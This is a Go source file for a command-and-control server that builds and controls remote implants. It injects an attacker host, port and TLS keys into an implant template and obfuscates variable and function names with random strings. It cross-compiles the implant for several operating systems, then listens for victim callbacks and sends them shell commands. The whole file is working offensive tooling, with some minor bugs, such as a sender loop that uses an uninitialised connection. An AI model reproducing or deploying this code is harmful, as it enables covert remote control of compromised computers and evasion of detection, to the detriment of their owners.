package main

import (
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"io"
	"io/ioutil"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"regexp"
	"strconv"
	"strings"
	"time"

	"github.com/akamensky/argparse"
	"github.com/fatih/color"
	"github.com/taion809/haikunator"
)

var implants []*Implant
var base_id = 0

type Implant struct {
	name string
	id   int
	conn net.Conn
}

var red = color.New(color.FgRed).SprintFunc()
var green = color.New(color.FgGreen).SprintFunc()
var cyan = color.New(color.FgBlue).SprintFunc()
var bold = color.New(color.Bold).SprintFunc()
var yellow = color.New(color.FgYellow).SprintFunc()

func exit_on_error(message string, err error) {
	if err != nil {
		fmt.Printf("%s %v", red("["+message+"]"+":"), err.Error())
		os.Exit(0)
	}
}

func print_good(msg string) {
	dt := time.Now()
	t := dt.Format("15:04")
	fmt.Printf("[%s] %s :: %s ", green(t), green(bold("[+]")), msg)
	//p()
}

func print_info(msg string) {
	dt := time.Now()
	t := dt.Format("15:04")
	fmt.Printf("[%s] [*] :: %s", t, msg)
	//p()
}

func print_error(msg string) {
	dt := time.Now()
	t := dt.Format("15:04")
	fmt.Printf("[%s] %s :: %s ", red(t), red(bold("[x]")), msg)
	//p()
}

func print_warning(msg string) {
	dt := time.Now()
	t := dt.Format("15:04")
	fmt.Printf("[%s] %s :: %s ", yellow(t), yellow(bold("[!]")), msg)
}

func haikunate() string {
	h := haikunator.NewHaikunator()
	return h.DelimHaikunate(".")
}

func base64_encode(str string) string {
	return base64.StdEncoding.EncodeToString([]byte(str))
}

func write_to_file(filename string, data string) {
	file, err := os.Create(filename)
	exit_on_error("FILE CREATION ERROR", err)
	defer file.Close()

	_, err = io.WriteString(file, data)
	exit_on_error("FILE WRITE ERROR", err)
}

func read_from_file(file string) string {
	fil, err := os.Open(file)
	exit_on_error("FILE OPEN ERROR", err)
	//defer file.Close()
	b, _ := ioutil.ReadAll(fil)
	return string(b)
}

func send_data(conn net.Conn, message string) {
	_, err := io.WriteString(conn, message+"\n")
	exit_on_error("Cannot send data", err)
}

func var_obfu(template string) string {
	str_len := 10
	var_names_re := regexp.MustCompile(`VAR_.*_AB`)
	var_names_to_replace := var_names_re.FindAllString(template, -1)
	for var_name := range var_names_to_replace {
		v := var_names_to_replace[var_name]
		obf_var_name := random_string(str_len)
		template = strings.Replace(template, v, obf_var_name, -1)
	}
	return template
}

func func_obfu(template string) string {
	str_len := 10
	func_names_re := regexp.MustCompile(`FUNC_.*_X`)
	func_names_to_replace := func_names_re.FindAllString(template, -1)
	for func_name := range func_names_to_replace {
		obf_func_name := random_string(str_len)
		function := func_names_to_replace[func_name]
		template = strings.Replace(template, function, obf_func_name, -1)
	}
	return template
}

func compile(shrink bool, arch, platform string) {
	ldflags := ""
	if shrink {
		ldflags = "-w -s"
	}
	cmd := exec.Command("env", fmt.Sprintf("GOOS=%s", platform),
		fmt.Sprintf("GOARCH=%s", arch),
		"go", "build", "-o my_implant",
		"-ldflags", ldflags, "outfile.go")
	output, err := cmd.CombinedOutput()
	if err != nil {
		//p()
		fmt.Println(red("[!!!] COMPILATION ERROR: " + err.Error()))
		fmt.Println(string(output))
		//p()
		os.Exit(0)
	} else {
		fmt.Println(string(output))
	}
}

func prepare_template(lhost, lport string) string {
	template := read_from_file("implant.go")
	key_1 := read_from_file("client.pem")
	key_2 := read_from_file("client.key")
	template = strings.Replace(template, "OPT_SERVER_HOST", lhost, -1)
	template = strings.Replace(template, "OPT_SERVER_PORT", lport, -1)
	template = strings.Replace(template, "KEY_1_BASE64", key_1, -1)
	template = strings.Replace(template, "KEY_2_BASE64", key_2, -1)
	template = var_obfu(template)
	template = func_obfu(template)
	write_to_file("outfile.go", template)
	return template
}

func start_sender() {
	for {
		fmt.Println("$ > ")
		var cmd string
		fmt.Scanln(&cmd)
		implant := new(Implant)
		//for implant = range implants {
		send_data(implant.conn, cmd)
		//}
	}
}

func start_server(lport int) {
	cert, err := tls.LoadX509KeyPair("server.pem", "server.key")
	exit_on_error("LOADKEYS", err)
	config := tls.Config{Certificates: []tls.Certificate{cert}}
	//config.Rand := rnd.Reader
	service := "0.0.0.0:" + strconv.Itoa(lport)
	listener, err := tls.Listen("tcp", service, &config)
	//p()
	print_info("Started listener...")
	//p()
	go start_sender()
	for {
		connection, err := listener.Accept()
		fmt.Println("")
		exit_on_error("SERVER ACCEPT ERROR", err)
		n := haikunate()
		//dt := time.Now()
		//t := dt.Format("15:04")
		addr := strings.Split(connection.RemoteAddr().String(), ":")[0]
		fmt.Println("Received connection from: %s", addr)
		implant := &Implant{
			conn: connection,
			name: n,
			id:   base_id,
		}
		//implant.Init()
		implants = append(implants, implant)
		//if (len(active_ids) == 0 || add) {
		//active_ids = append(active_ids, base_id)

		go start_receiver(connection, n, base_id)
		base_id += 1
	}
}

func start_receiver(conn net.Conn, name string, id int) {
	defer conn.Close()
	buf := make([]byte, 100024)
	for {
		n, _ := conn.Read(buf)
		rcv := string(buf[:n])
		dt := time.Now()
		cur_time := dt.Format("15:04")
		if len(rcv) > 1 {
			fmt.Println("\n~~~~~~~~~~~~ (%s ~ %s) [%s] ~~~~~~~~~~~~", cyan(id), red(name), bold(cur_time))
		}
		fmt.Println(rcv)
	}
}

func random_string(n int) string {
	var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")

	s := make([]rune, n)
	for i := range s {
		s[i] = letters[rand.Intn(len(letters))]
	}
	return string(s)
}

func get_local_ip() string {
	conn, _ := net.Dial("udp", "8.8.8.8:80")
	defer conn.Close()
	ip := conn.LocalAddr().(*net.UDPAddr).IP
	return fmt.Sprintf("%d.%d.%d.%d", ip[0], ip[1], ip[2], ip[3])
}

func main() {
	parser := argparse.NewParser("master", "")
	var platform *string = parser.Selector("p", "platform", []string{"darwin", "linux", "windows", "netbsd", "openbsd", "solaris", "freebsd"},
		&argparse.Options{Required: false, Default: "linux", Help: "Platform to target"})
	var arch *string = parser.Selector("a", "arch", []string{"386", "amd64", "arm", "arm64", "ppc64"},
		&argparse.Options{Required: false, Default: "386", Help: "Architecture to target"})
	var lhost *string = parser.String("l", "lhost", &argparse.Options{Required: false, Default: get_local_ip(), Help: "Host to bind or connect to"})
	var lport *string = parser.String("r", "lport", &argparse.Options{Required: false, Default: "4444", Help: "Port to start server on"})
	var shrink *bool = parser.Flag("s", "shrink", &argparse.Options{Required: false, Help: "Shrink the implant"})
	err := parser.Parse(os.Args)
	exit_on_error("[PARSER ERROR]", err)
	prepare_template(*lhost, *lport)
	compile(*shrink, *arch, *platform)
	start_server(4444)
}
